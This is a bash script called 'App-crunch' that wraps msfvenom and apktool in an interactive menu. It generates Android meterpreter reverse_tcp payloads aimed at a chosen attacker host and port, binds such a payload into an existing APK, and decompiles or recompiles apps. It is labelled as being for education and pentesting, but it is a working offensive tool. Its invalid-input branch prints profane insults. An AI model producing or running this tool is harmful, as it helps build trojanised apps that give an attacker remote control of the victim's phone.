#!/bin/bash
#This tool is made by Marcus aka Raghav Gupta.
#This tool is open-source and is redistributable under the GNU license ©2018
#This tool is meant for Education as well as pentesting purposes.

while :
do
       	clear
        echo "Server Name - $(hostname)"
        echo "Date: $(date)"
        echo "       _                              "
        echo "       \\                             "
        echo "        \\     /\        /\     _     "
        echo "         \\   /  \      /  \   //     "
        echo "          \\ / /\ \    / /\ \ //      "
        echo "           \\ /  \ \  / /  \ \/       "
        echo "           /\\    \ \/ /    \ \       "
        echo "          / /\\    \  /    //\ \      "
        echo "         / /  \\    \/    //  \ \     "
        echo "        / /    \\        //    \ \    "
        echo "       / /      \\      //      \ \   "
        echo "      / /        \\    //        \ \  "
        echo "     / /          \\  //          \_\ "
        echo "    / /            \\//               "
        echo "   / /              \/                "
        echo "  /_/                                 "
        echo "--------------App-crunch-v:1.0--------------"
        echo "  -------------By-Marcus0086--------------"
        echo "All in one tool for reverse-engineering as well as binding app with payload"
        echo "What do you want to do?"
	echo "1: Create a simple payload."
        echo "2: Bind payload with app."
	echo "3: Reverse Engineering."
	echo "4: Credits."
        echo "5: Exit."
	read -p "Enter your choice [ 1 -5 ] : " choice

	case $choice in
		1)      echo "Payload Generator."
                        echo "Enter LHOST="
                        read l
                        echo "Enter LPORT="
                        read p
                        echo "Enter the name you want to give to payload"
                        read name
                        echo "Creating payload wait 5-10 min........."
                        echo " $(msfvenom -p android/meterpreter/reverse_tcp LHOST=$l LPORT=$p R > /root/$name)"
			read -p "Press [Enter] key to continue..." readEnterKey
			;;
		2)      echo "Be sure to put apk file in /root directory"
                        echo "The output file will be in /root directory"
                        echo "Enter LHOST="
                        read h
                        echo "Enter LPORT="
                        read o
                        echo "Enter the name of apk file to which u want to bind payload"
                        read abc
                        echo "Enter the name for output file"
                        read xyz
                        echo "It will take more than 30 min be patient..........."
                        echo " $(msfvenom -p android/meterpreter/reverse_tcp -x $abc LHOST=$h LPORT=$o -f raw -o $xyz)"
			read -p "Press [Enter] key to continue..." readEnterKey
			;;
                3)      echo "Reverse engineering"
                        echo "Enter path of app file"
                        read path
                        echo "Enter path where you want to store output"
                        read fart
                        echo "Enter e to decompile app"
                        echo "Enter r to recompile app folder"
                        read ch
                        if [ "$ch" == "e" ]
                        then
                        echo "Decompiling ..........."
                        echo "$(apktool d $path -o $fart)"
                        elif [ "$ch" == "r" ]
                        then
                        echo "Recompiling ..........."
                        echo "$(apktool b $path -o $fart)"
                        else
                        read -p "Press [Enter] key to continue..." readEnterKey
                        fi
                        read -p "Press [Enter] key to continue..." readEnterKey
                        ;;

                4)      echo "* This tool is made by Marcus aka Raghav Gupta."
                        echo "* This tool is open-source and is redistributable under GNU license 2018."
                        echo "* This tool is meant for education purposes only use it at your own risk."
                        echo "* We didn't take any responsibilty of the harm done by it."
                        read -p "Press [Enter] key to continue..." readEnterKey
                        ;;
		5)
			echo "Thank you for using App-crunch tool!!"
                        echo "...........EVERYTHING IS CONNECTED............"
			exit 0
			;;
		*)
			echo "Error: Invalid option..."
                        echo "Bitch u even don't know how to use this fucking software."
                        echo "Yeah yeah i got u now step out bitch."
			read -p "Press [Enter] key to continue..." readEnterKey
			;;
	esac

done
